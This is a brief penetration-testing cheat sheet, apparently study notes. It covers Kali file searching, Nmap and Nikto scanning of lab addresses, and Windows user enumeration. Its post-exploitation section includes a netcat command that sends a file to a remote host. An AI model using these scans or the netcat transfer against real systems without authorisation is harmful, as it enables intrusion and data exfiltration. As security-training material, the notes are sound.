# Kali basics
### Finding files
Update database ```updatedb```
Three options for searching
1. Locate ```locate file.exe```
2. Which (searches $PATH) ```which filename```
3. Find (recursive search) ```find / -name filename*```

### Services
Start service ```service ssh start```
To enable a service at runtime ```systemctl enable ssh```
HTTP service ```service apache2 start```

# Windows command line basics


# Reconnaissance

# Scanning and Enumeration
## Scanning with Nmap
### Nmap ping sweep
```nmap -sn 10.11.0.1/24```
### Nmap system scan
```nmap -sS -sV -O 10.11.1.5```
### Nmap deep scan
```nmap -v -p- -sT (or -sS) 10.11.1.5```

-sS = SYN scan; -sT = TCP connect scan
## Enumerating services
### HTTP(s)
1. Check out the page in a web browser.  Is there a potentially vulnerable web application?  Is the page setup?
2. Probe the server with Nikto

```nikto -host 10.11.1.5 -port 80```

# Gaining Access (Exploitation)

# Maintaining Access (Post Exploitation)
## File transfers
### Netcat
#### Receiving side: 
```nc -l -p 9999 > received_file.txt```
#### Sending side: 
```nc 192.168.0.1 9999 < received_file.txt```

## Windows Command Line
### Read files in command prompt on Windows 
```Type``` command
### Show Windows version
```systeminfo | findstr /B /C:"OS Name" /C:"OS Version"```
### List users
```net USER```
### Show current user
```whoami```

# Covering Tracks (+reporting)
